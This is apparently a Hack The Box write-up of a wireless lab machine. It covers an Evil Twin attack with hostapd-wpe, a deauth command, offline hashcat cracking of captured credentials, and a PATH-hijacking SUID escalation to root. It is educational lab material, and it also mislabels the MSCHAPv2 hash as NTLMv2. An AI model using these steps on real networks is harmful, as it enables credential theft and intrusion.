Overview

AirTouch is a Medium-rated Hack The Box machine focused entirely on wireless security. The attack chain begins with passive WiFi reconnaissance to discover nearby networks, then deploys an Evil Twin access point with hostapd-wpe to intercept WPA2-EAP credentials. The captured NETNTLM hash is cracked offline with hashcat, granting SSH access. Finally, a misconfigured SUID binary leads to full root compromise.

02

Wireless Reconnaissance

Start by putting the wireless adapter in monitor mode so we can passively capture all 802.11 frames in range.

$ sudo airmon-ng start wlan0 # Interface wlan0 renamed to wlan0mon

With monitor mode active, scan for nearby access points:

$ sudo airodump-ng wlan0mon
BSSID PWR Beacons #Data CH ENC ESSID AA:BB:CC:DD:EE:FF -62 120 0 6 WPA2 CorporateWifi 11:22:33:44:55:66 -78 44 3 11 WPA2 HomeRouter

The target is CorporateWifi — a WPA2-Enterprise (EAP) network on channel 6. Enterprise networks use a RADIUS server for authentication, meaning clients send their credentials (username + NTLMv2 hash) during the EAP handshake. We can exploit this.

ℹ
WPA2-Enterprise vs WPA2-Personal WPA2-Personal uses a shared passphrase. WPA2-Enterprise authenticates each user individually via EAP protocols (PEAP, TTLS), transmitting NTHash-derived material that can be intercepted and cracked.

Narrow the capture to the target channel and record the BSSID:

$ sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon
03

Evil Twin — hostapd-wpe

hostapd-wpe (Wireless Pwnage Edition) is a patched version of hostapd that acts as a rogue access point mimicking a WPA2-EAP network. When a victim client attempts to connect to our fake AP, it initiates the EAP handshake against our RADIUS server, leaking the NETNTLM hash in the process.

Configuration

Create a configuration file targeting the victim network:

interface=wlan0 ssid=CorporateWifi channel=6 hw_mode=g wpe_logfile=/tmp/wpe.log ieee8021x=1 eapol_key_index_workaround=0 eap_server=1 eap_user_file=hostapd-wpe.eap_user ca_cert=/etc/hostapd-wpe/certs/ca.pem server_cert=/etc/hostapd-wpe/certs/server.pem private_key=/etc/hostapd-wpe/certs/server.key private_key_passwd=whatever dh_file=/etc/hostapd-wpe/certs/dh auth_algs=3 wpa=2 wpa_key_mgmt=WPA-EAP rsn_pairwise=CCMP

Launch the rogue AP

$ sudo hostapd-wpe hostapd-wpe.conf Configuration file: hostapd-wpe.conf Using interface wlan0 with hwaddr aa:bb:cc:dd:ee:ff and ssid "CorporateWifi" wlan0: interface state UNINITIALIZED->ENABLED wlan0: AP-ENABLED
⚠
De-authentication attack (optional) To force clients off the legitimate AP faster, you can send de-auth frames with aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon. Use only in lab environments.

Hash Cracking

Copy the full mschap line from the log into a file and feed it to hashcat. NTLMv2 hashes (MSCHAPv2 challenge-response) correspond to hashcat mode -m 5500.

$ echo 'administrator::d017f08ed27b4f1a:5c33a914f82de1025e721ac93b87aa4e...' > hash.txt $ hashcat -m 5500 hash.txt /usr/share/wordlists/rockyou.txt --force

Privilege Escalation

SUID Enumeration

Search for SUID binaries owned by root:

administrator@airtouch:~$ find / -perm -4000 -user root 2>/dev/null /usr/bin/mount /usr/bin/su /usr/bin/passwd /usr/local/bin/air-connect ← non-standard!

/usr/local/bin/air-connect is not a standard Linux binary. Inspect what it does:

administrator@airtouch:~$ strings /usr/local/bin/air-connect | grep -i sh /bin/sh system ping
administrator@airtouch:~$ ltrace /usr/local/bin/air-connect 2>&1 | head system("ping -c 1 " ...)

The binary calls system() with a relative command (ping) without specifying the full path — a classic PATH hijacking vulnerability.

PATH Hijacking

administrator@airtouch:~$ mkdir /tmp/evil && cd /tmp/evil # Create malicious 'ping' that spawns a shell administrator@airtouch:/tmp/evil$ echo '#!/bin/bash' > ping administrator@airtouch:/tmp/evil$ echo '/bin/bash -p' >> ping administrator@airtouch:/tmp/evil$ chmod +x ping # Prepend our directory to PATH administrator@airtouch:/tmp/evil$ export PATH=/tmp/evil:$PATH # Execute the SUID binary administrator@airtouch:/tmp/evil$ /usr/local/bin/air-connect bash-5.0# id uid=1001(administrator) gid=1001(administrator) euid=0(root) groups=1001(administrator)
